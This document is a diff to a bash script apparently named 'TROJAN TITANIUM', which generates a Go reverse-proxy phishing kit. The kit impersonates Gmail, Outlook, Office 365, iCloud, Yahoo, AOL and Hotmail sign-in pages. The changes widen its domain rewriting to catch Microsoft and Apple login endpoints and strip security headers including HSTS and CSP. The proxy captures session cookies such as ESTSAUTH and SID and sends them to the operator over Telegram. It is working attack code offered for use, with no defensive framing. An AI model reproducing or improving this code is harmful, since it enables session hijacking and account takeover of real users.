@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJAN - TITANIUM V18.7 - AIRTIGHT PROXY EDITION
+# 🏛️ TROJAN - TITANIUM V18.8 - AIRTIGHT HOST-ENFORCEMENT
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -72,7 +72,7 @@ while true; do
     fi
 done
 
-# --- 6. SELF-HEALING ENGINE (AIRTIGHT PROXY UPGRADE) ---
+# --- 6. SELF-HEALING ENGINE (AIRTIGHT HOST-ENFORCEMENT) ---
 echo -e "${CYAN}[...] Rebuilding Airtight Proxy Engine...${NC}"
 
 # A. main.go (SSL for all 7 Lures)
@@ -85,7 +85,7 @@ import (
 )
 func main() {
 	base := "$USER_DOMAIN"
-	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.7\033[0m")
+	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.8\033[0m")
 	certmagic.DefaultACME.Agreed = true
 	certmagic.DefaultACME.Email = "admin@" + base
 	mux := http.NewServeMux()
@@ -99,7 +99,7 @@ func main() {
 }
 EOF
 
-# B. proxy.go (Airtight Leak-Proof Logic)
+# B. proxy.go (Airtight Host-Enforcement Version)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 import (
@@ -114,13 +114,14 @@ import (
 func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	remote, _ := url.Parse("https://" + t.BaseDomain)
 	proxy := httputil.NewSingleHostReverseProxy(remote)
-	
-	// Capture the current phishing host (e.g. office.domain.com)
 	myHost := r.Host 
 
+	// HOST ENFORCEMENT & IP SPOOF PROTECTION
 	r.Host = remote.Host
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
+	r.Header.Set("X-Forwarded-Host", myHost)
+	r.Header.Set("X-Real-IP", r.RemoteAddr)
 
 	if r.Method == "POST" {
 		body, _ := io.ReadAll(r.Body)
@@ -132,21 +133,24 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	}
 
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		// 1. AIRTIGHT HEADER SWEEP: Rewrite all headers including Location and Set-Cookie
+		// 1. DYNAMIC HEADER SWEEP (Catches Office & iCloud Breakouts)
 		for header, values := range resp.Header {
 			for i, v := range values {
-				if strings.Contains(v, t.BaseDomain) {
+				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
 					resp.Header[header][i] = strings.ReplaceAll(v, t.BaseDomain, myHost)
+				}
+				// Specific catch for Microsoft OAuth leaks
+				if strings.Contains(v, "login.microsoftonline.com") {
+					resp.Header[header][i] = strings.ReplaceAll(v, "login.microsoftonline.com", myHost)
 				}
 			}
 		}
 
-		// 2. CAPTURE & REDIRECT
+		// 2. CAPTURE & SUCCESS REDIRECT
 		for _, c := range resp.Cookies() {
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
 					SendToTelegram(fmt.Sprintf("🎯 [%s] SUCCESS! %s=%s", t.Name, c.Name, c.Value))
-					// Success Redirect
 					resp.Header.Set("Location", "https://www.google.com/docs/about/")
 					resp.StatusCode = 302
 					return nil
@@ -154,19 +158,22 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		// 3. STRIP SECURITY
+		// 3. SECURITY STRIP
 		resp.Header.Del("Content-Security-Policy")
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("X-Content-Type-Options")
+		resp.Header.Del("Strict-Transport-Security")
 
-		// 4. AIRTIGHT BODY REWRITE: Fix HTML and JavaScript leaks
+		// 4. AIRTIGHT BODY REWRITE (HTML/JS/JSON)
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
 			oldBody, _ := io.ReadAll(resp.Body)
 			bodyStr := string(oldBody)
 			
-			// Global replacement of target domain with phishing domain
 			newContent := strings.ReplaceAll(bodyStr, t.BaseDomain, myHost)
+			// Secondary sweep for hardcoded Microsoft/Apple endpoints
+			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
+			newContent = strings.ReplaceAll(newContent, "www.icloud.com", myHost)
 			
 			resp.Body = io.NopCloser(bytes.NewBufferString(newContent))
 			resp.ContentLength = int64(len(newContent))
@@ -189,7 +196,7 @@ func GetTargetConfig(host string) *Target {
 		"gmail":   {"Gmail", "accounts.google.com", []string{"SID", "HSID", "SSID"}},
 		"outlook": {"Outlook", "login.live.com", []string{"MSPAuth"}},
 		"office":  {"Office", "login.microsoftonline.com", []string{"ESTSAUTH"}},
-		"icloud":  {"iCloud", "idmsa.apple.com", []string{"session_token"}},
+		"icloud":  {"iCloud", "www.icloud.com", []string{"session_token"}},
 		"yahoo":   {"Yahoo", "login.yahoo.com", []string{"B", "T"}},
 		"aol":     {"AOL", "login.aol.com", []string{"B", "T"}},
 		"hotmail": {"Hotmail", "login.live.com", []string{"MSPAuth"}},
